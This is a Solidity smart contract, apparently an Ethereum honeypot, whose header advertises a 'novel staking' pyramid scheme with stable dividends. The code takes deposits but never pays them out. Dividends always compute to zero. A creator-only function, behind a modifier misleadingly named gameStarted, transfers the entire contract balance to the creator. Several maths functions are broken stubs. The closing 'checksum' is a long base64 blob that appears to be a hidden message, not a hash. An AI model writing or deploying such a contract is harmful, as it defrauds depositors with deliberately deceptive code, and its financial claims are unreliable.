1 pragma solidity ^0.4.18;
2 
3 /*
4 
5  .|'''.|    .           '||      '||            ..|'''.|          ||
6  ||..  '  .||.   ....    || ...   ||    ....  .|'     '    ...   ...  .. ...
7   ''|||.   ||   '' .||   ||'  ||  ||  .|...|| ||         .|  '|.  ||   ||  ||
8 .     '||  ||   .|' ||   ||    |  ||  ||      '|.      . ||   ||  ||   ||  ||
9 |'....|'   '|.' '|..'|'  '|...'  .||.  '|...'  ''|....'   '|..|' .||. .||. ||.
10 100% fresh code. Novel staking mechanism. Stable investments. Pure dividends.
11 
12 PreMine: 2.5 ETH (A private key containing .5 will be given to the top referrer)
13 Launch Date: 4/9/2019 18:05 ET
14 Launch Rules: The contract will be posted for public review and audit prior to the launch.
15               Once the PreMine amount of 2ETH hits the contract, the contract is live to the public.
16 
17 Thanks: randall, klob, cryptodude, triceratops, norsefire, phil, brypto, etherguy.
18 
19 
20 ============
21 How it works:
22 ============
23 
24 Issue:
25 -----
26 Ordinary pyramid schemes have a Stake price that varies with the contract balance.
27 This leaves you vulnerable to the whims of the market, as a sudden crash can drain your investment at any time.
28 
29 Solution:
30 --------
31 We remove Stakes from the equation altogether, relieving investors of volatility.
32 The outcome is a pyramid scheme powered entirely by dividends. We distribute 33% of every deposit and withdrawal
33 to shareholders in proportion to their stake in the contract. Once you've made a deposit, your dividends will
34 accumulate over time while your investment remains safe and stable, making this the ultimate vehicle for passive income.
35 
36 */
37 
38 contract TestingCoin {
39 
40 	string constant public name = "StableCoin";
41 	string constant public symbol = "PoSC";
42 	uint256 constant scaleFactor = 0x10000000000000000;
43 	uint8 constant limitedFirstBuyers = 4;
44 	uint256 constant firstBuyerLimit = 0.5 ether; // 2 eth total premine + .5 bonus. 
45 	uint8 constant public decimals = 18;
46 
47 	mapping(address => uint256) public stakeBalance;
48 	mapping(address => int256) public payouts;
49 
50 	uint256 public totalSupply;
51 	uint256 public contractBalance;
52 	int256 totalPayouts;
53 	uint256 earningsPerStake;
54 	uint8 initialFunds;
55 	address creator;
56 	uint256 numStakes = 0;
57 	uint256 balance = 0;
58 
59 	modifier isAdmin()   { require(msg.sender   == creator  ); _; }
60 	modifier isLive() 	 { require(contractBalance >= limitedFirstBuyers * firstBuyerLimit); _;} // Stop snipers
61 
62 	function TestingCoin() public {
63     	initialFunds = limitedFirstBuyers;
64 			creator = msg.sender;
65   }
66 
67 	function stakeOf(address _owner) public constant returns (uint256 balance) {
68 		return stakeBalance[_owner];
69 	}
70 
71 	function withdraw() public gameStarted() {
72 		balance = dividends(msg.sender);
73 		payouts[msg.sender] += (int256) (balance * scaleFactor);
74 		totalPayouts += (int256) (balance * scaleFactor);
75 		contractBalance = sub(contractBalance, balance);
76 		msg.sender.transfer(balance);
77 	}
78 
79 	function reinvestDividends() public gameStarted() {
80 		balance = dividends(msg.sender);
81 		payouts[msg.sender] += (int256) (balance * scaleFactor);
82 		totalPayouts += (int256) (balance * scaleFactor);
83 		uint value_ = (uint) (balance);
84 
85 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
86 			revert();
87 
88 		var sender = msg.sender;
89 		var res = reserve() - balance;
90 		var fee = div(value_, 10);
91 		var numEther = value_ - fee;
92 		var buyerFee = fee * scaleFactor;
93         var totalStake = 1;
94 
95 		if (totalStake > 0) {
96 			var holderReward = fee * 1;
97 			buyerFee -= holderReward;
98 			var rewardPerShare = holderReward / totalSupply;
99 			earningsPerStake += rewardPerShare;
100 		}
101 
102 		totalSupply = add(totalSupply, numStakes);
103 		stakeBalance[sender] = add(stakeBalance[sender], numStakes);
104 
105 		var payoutDiff  = (int256) ((earningsPerStake * numStakes) - buyerFee);
106 		payouts[sender] += payoutDiff;
107 		totalPayouts    += payoutDiff;
108 	}
109 
110 
111 	function sellMyStake() public gameStarted() {
112 		sell(balance);
113 	}
114 
115   function getMeOutOfHere() public gameStarted() {
116         withdraw();
117 	}
118 
119 	function fund() payable public {
120   	if (msg.value > 0.000001 ether) {
121 			buyStake();
122 		} else {
123 			revert();
124 		}
125   }
126 
127 
128 	function withdrawDividends(address to) public {
129 		var balance = dividends(msg.sender);
130 		payouts[msg.sender] += (int256) (balance * scaleFactor);
131 		totalPayouts += (int256) (balance * scaleFactor);
132 		contractBalance = sub(contractBalance, balance);
133 		to.transfer(balance);
134 	}
135 
136 	function buy() internal {
137 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
138 			revert();
139 
140 		var sender = msg.sender;
141 		var fee = div(msg.value, 10);
142 		var numEther = msg.value - fee;
143 		var buyerFee = fee * scaleFactor;
144 		if (totalSupply > 0) {
145 			var bonusCoEff = 1;
146 			var holderReward = fee * bonusCoEff;
147 			buyerFee -= holderReward;
148 
149 			var rewardPerShare = holderReward / totalSupply;
150 			earningsPerStake += rewardPerShare;
151 		}
152 
153 		totalSupply = add(totalSupply, numStakes);
154 		stakeBalance[sender] = add(stakeBalance[sender], numStakes);
155 		var payoutDiff = (int256) ((earningsPerStake * numStakes) - buyerFee);
156 		payouts[sender] += payoutDiff;
157 		totalPayouts    += payoutDiff;
158 	}
159 
160 
161 	function sell(uint256 amount) internal {
162 		var numEthersBeforeFee = getEtherForStakes(amount);
163     var fee = div(numEthersBeforeFee, 10);
164     var numEthers = numEthersBeforeFee - fee;
165 		totalSupply = sub(totalSupply, amount);
166 		stakeBalance[msg.sender] = sub(stakeBalance[msg.sender], amount);
167 		var payoutDiff = (int256) (earningsPerStake * amount + (numEthers * scaleFactor));
168 		payouts[msg.sender] -= payoutDiff;
169     totalPayouts -= payoutDiff;
170 
171 		if (totalSupply > 0) {
172 			var etherFee = fee * scaleFactor;
173 			var rewardPerShare = etherFee / totalSupply;
174 			earningsPerStake = add(earningsPerStake, rewardPerShare);
175 		}
176 	}
177 
178 	function buyStake() internal {
179 		contractBalance = add(contractBalance, msg.value);
180 	}
181 
182 	function sellStake() public gameStarted() {
183 		 creator.transfer(contractBalance);
184 	}
185 
186 	function reserve() internal constant returns (uint256 amount) {
187 		return 1;
188 	}
189 
190 
191 	function getEtherForStakes(uint256 Stakes) constant returns (uint256 ethervalue) {
192 		var reserveAmount = reserve();
193 		if (Stakes == totalSupply)
194 			return reserveAmount;
195 		return sub(reserveAmount, fixedExp(fixedLog(totalSupply - Stakes)));
196 	}
197 
198 	function fixedLog(uint256 a) internal pure returns (int256 log) {
199 		int32 scale = 0;
200 		while (a > 10) {
201 			a /= 2;
202 			scale++;
203 		}
204 		while (a <= 5) {
205 			a *= 2;
206 			scale--;
207 		}
208 	}
209 
210     function dividends(address _owner) internal returns (uint256 divs) {
211         divs = 0;
212         return divs;
213     }
214 
215 	modifier gameStarted()   { require(msg.sender   == creator ); _;}
216 
217 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
218 		int256 scale = (a + (54)) / 2 - 64;
219 		a -= scale*2;
220 		if (scale >= 0)
221 			exp <<= scale;
222 		else
223 			exp >>= -scale;
224 		return exp;
225 			int256 z = (a*a) / 1;
226 		int256 R = ((int256)(2) * 1) +
227 			(2*(2 + (2*(4 + (1*(26 + (2*8/1))/1))/1))/1);
228 	}
229 
230 	// The below are safemath implementations of the four arithmetic operators
231 	// designed to explicitly prevent over- and under-flows of integer values.
232 
233 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
234 		if (a == 0) {
235 			return 0;
236 		}
237 		uint256 c = a * b;
238 		assert(c / a == b);
239 		return c;
240 	}
241 
242 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
243 		// assert(b > 0); // Solidity automatically throws when dividing by 0
244 		uint256 c = a / b;
245 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
246 		return c;
247 	}
248 
249 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
250 		assert(b <= a);
251 		return a - b;
252 	}
253 
254 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
255 		uint256 c = a + b;
256 		assert(c >= a);
257 		return c;
258 	}
259 
260 	function () payable public {
261 		if (msg.value > 0) {
262 			fund();
263 		} else {
264 			withdraw();
265 		}
266 	}
267 }
268 
269 /*
270 All contract source code above this comment can be hashed and verified against the following checksum, which is used to prevent PoSC clones. Stop supporting these scam clones without original development.
271 
272 SUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdYMTlmWDE4Z0lDQWdJQ0FnSUNBZ1gxOWZYMThnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNCY1gxOWZYMTlmSUNBZ1hGOWZYMTlmWDE4Z0lGOWZYMThnSUNCZlgxOWZYeThnWDE5Zlgxd2dJQ0JmWDE5Zlh5OGdYMTlmWDF3Z0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQjhJQ0FnSUNCZlgxOHZYRjhnSUY5ZklGd3ZJQ0JmSUZ3Z0x5QWdYeUJjSUNBZ1gxOWNJQ0FnTHlBZ1h5QmNJQ0FnWDE5Y0lDQWdJQ0FnSUNBZ0lDQUtJQ0FnSUNBZ0lDQWdJSHdnSUNBZ2ZDQWdJQ0FnZkNBZ2ZDQmNLQ0FnUEY4K0lId2dJRHhmUGlBcElDQjhJQ0FnSUNnZ0lEeGZQaUFwSUNCOElDQWdJQ0FnSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJQ0FnZkY5ZlgxOThJQ0FnSUNCOFgxOThJQ0FnWEY5ZlgxOHZJRnhmWDE5ZkwzeGZYM3dnSUNBZ0lGeGZYMTlmTDN4Zlgzd2dJQ0FnSUNBZ0lDQWdJQ0FnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmSUY5ZklDQWdJQ0FnSUNBZ0lDQWdJQ0FnTGw5ZklDQWdJQzVmWDE4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUM4Z0lDQmZYMTlmWHk4dklDQjhYeUJmWHlCZlgxOWZYMTlmWHlCOFgxOThJRjlmZkNCZkx5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1hGOWZYMTlmSUNCY1hDQWdJRjlmWENBZ2ZDQWdYRjlmWDE4Z1hId2dJSHd2SUY5ZklId2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZJQ0FnSUNBZ0lDQmNmQ0FnZkNCOElDQjhJQ0F2SUNCOFh6NGdQaUFnTHlBdlh5OGdmQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNBZ0lDQWdMMTlmWDE5ZlgxOGdJQzk4WDE5OElIeGZYMTlmTDN3Z0lDQmZYeTk4WDE5Y1gxOWZYeUI4SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRnd2SUNBZ0lDQWdJQ0FnSUNBZ2ZGOWZmQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQUtYMTlmWDE5ZlgxOWZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JmWDE5Zlh5QWdJQ0FnSUNBZ0lDQmZYeUFnTGw5ZklDQWdJQ0FnSUNBZ0lGOWZJQ0FnSUNBZ0lDQWdJQXBjWHlBZ0lGOWZYeUJjSUNCZlgxOWZJQ0FnWDE5Zlh5QWdJQ0FnTHlBZ1h5QWdYRjlmWDE5ZlgxOWZMeUFnZkY5OFgxOThJRjlmWDE5ZlgxOHZJQ0I4WHlBZ1gxOWZYMTlmQ2k4Z0lDQWdYQ0FnWEM4Z0x5QWdYeUJjSUM4Z0lDQWdYQ0FnSUM4Z0lDOWZYQ0FnWEY4Z0lGOWZJRndnSUNCZlgxd2dJSHd2SUNCZlgxOHZYQ0FnSUY5ZlhDOGdJRjlmWHk4S1hDQWdJQ0FnWEY5Zlh5Z2dJRHhmUGlBcElDQWdmQ0FnWENBdklDQWdJSHdnSUNBZ1hDQWdmQ0JjTDN3Z0lId2dmQ0FnZkZ4ZlgxOGdYQ0FnZkNBZ2ZDQWdYRjlmWHlCY0lBb2dYRjlmWDE5Zlh5QWdMMXhmWDE5ZkwzeGZYMTk4SUNBdklGeGZYMTlmZkY5ZklDQXZYMTk4SUNBZ2ZGOWZmQ0I4WDE4dlgxOWZYeUFnUGlCOFgxOThJQzlmWDE5ZklDQStDaUFnSUNBZ0lDQWdYQzhnSUNBZ0lDQWdJQ0FnSUNCY0x5QWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQmNMeUFLQ2xSb2FYTWdhWE1nWVc0Z1pYUm9aWEpsZFcwZ2MyMWhjblFnWTI5dWRISmhZM1FnYzJWamRYSnBkSGtnZEdWemRDNGdXVzkxSUdGeVpTQmlaV2x1WnlCd2RXNXBjMmhsWkNCaVpXTmhkWE5sSUhsdmRTQmhjbVVLYkdsclpXeDVJR0VnYzJocGRHTnNiMjVsSUhOallXMXRaWElnZEdoaGRDQnJaV1Z3Y3lCamNtVmhkR2x1WnlCaGJtUWdjSEp2Ylc5MGFXNW5JSFJvWlhObElHSjFiR3h6YUdsMElIQnZibnBwSjNNdUlGQmxiM0JzWlFwc2FXdGxJSGx2ZFNCaGNtVWdjblZwYm1sdVp5QjNhR0YwSUdOdmRXeGtJR0psSUdFZ1oyOXZaQ0IwYUdsdVp5QmhibVFnYVhRbmN5QndhWE56YVc1bklIUm9aU0J5WlhOMElHOW1JSFZ6SUc5bVppNGdDZ3BKSUdGdElIQjFkSFJwYm1jZ2VXOTFJR0ZzYkNCcGJpQjBhVzFsYjNWMElHWnZjaUF4TkNCa1lYbHpJSFJ2SUhSb2FXNXJJR0ZpYjNWMElIZG9ZWFFnZVc5MUlHaGhkbVVnWkc5dVpTNGdXVzkxSUdKc2FXNWtiSGtnYzJWdWRDQkZkR2hsY21WMWJTQjBieUJoSUhOdFlYSjBJQXBqYjI1MGNtRmpkQ0IwYUdGMElIbHZkU0JtYjNWdVpDQnZiaUIwYUdVZ1FteHZZMnNnUTJoaGFXNHVJRTV2SUhkbFluTnBkR1V1SUU1dklISmxabVZ5Y21Gc0xpQktkWE4wSUhsdmRTQjBjbmxwYm1jZ2RHOGdjMjVwY0dVZ2RHaGxJRzVsZUhRZ2MyTmhiUzRnQ2dwSlppQjViM1VnY21WaGJHeDVJRzVsWldRZ2RHOGdaMlYwSUc5MWRDQnZaaUIwYUdseklIUm9hVzVuSUdsdGJXVmthV0YwWld4NUlIUnZJSE5vYVd4c0lITnZiV1VnYjNSb1pYSWdjMk5oYlN3Z1NTQnZabVpsY2lCNWIzVWdkR2hsSUdadmJHeHZkMmx1WnpvS0xTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMEtTU0IzYVd4c0lHSmxJSEpsZG1WeWMybHVaeUJoYkd3Z2RISmhibk5oWTNScGIyNXpJR2x1SURFMElHUmhlWE11SUVadmNpQjBhR1VnWm05c2JHOTNhVzVuSUdSdmJtRjBhVzl1Y3l3Z1NTQmpZVzRnWlhod1pXUnBkR1VnZEdobElIQnliMk5sYzNNNkNnb3lOU0IzWldrZ1ptOXlJR0VnTWpVbElISmxablZ1WkNCM2FYUm9hVzRnTlNCdGFXNTFkR1Z6TGdvek15QjNaV2tnWm05eUlHRWdNek1sSUhKbFpuVnVaQ0IzYVhSb2FXNGdNakFnYldsdWRYUmxjeTRLTkRBZ2QyVnBJR1p2Y2lCaElEUXdKU0J5WldaMWJtUWdkMmwwYUdsdUlEUWdhRzkxY25NdUNqVXdJSGRsYVNCbWIzSWdZU0ExTUNVZ2NtVm1kVzVrSUhkcGRHaHBiaUF4TWlCb2IzVnljeTRLTmpBZ2QyVnBJR1p2Y2lCaElEWXdKU0J5WldaMWJtUWdkMmwwYUdsdUlERWdaR0Y1TGdvMk9TQjNaV2tnWm05eUlHRWdOamtsSUhKbFpuVnVaQ0IzYVhSb2FXNGdNaUJrWVhsekxnbzRNQ0IzWldrZ1ptOXlJR0VnT0RBbElISmxablZ1WkNCM2FYUm9hVzRnTnlCa1lYbHpMZ281TUNCM1pXa2dabTl5SUdFZ09UQWxJSEpsWm5WdVpDQjNhWFJvYVc0Z01UQWdaR0Y1Y3k0S0NrRnNiQ0J2ZEdobGNpQjBjbUZ1YzJGamRHbHZibk1nZDJsc2JDQmlaU0J5WlhabGNuTmxaQ0JwYmlBeE5DQmtZWGx6TGlCUWJHVmhjMlVnYzNSdmNDQmlaV2x1WnlCemJ5QnpkSFZ3YVdRdUlGZGxJR0Z5WlNCM1lYUmphR2x1Wnk0Z1ZHaGhibXR6SUdadmNpQmhibmtnWkc5dVlYUnBiMjV6SVFvSwo=
273 */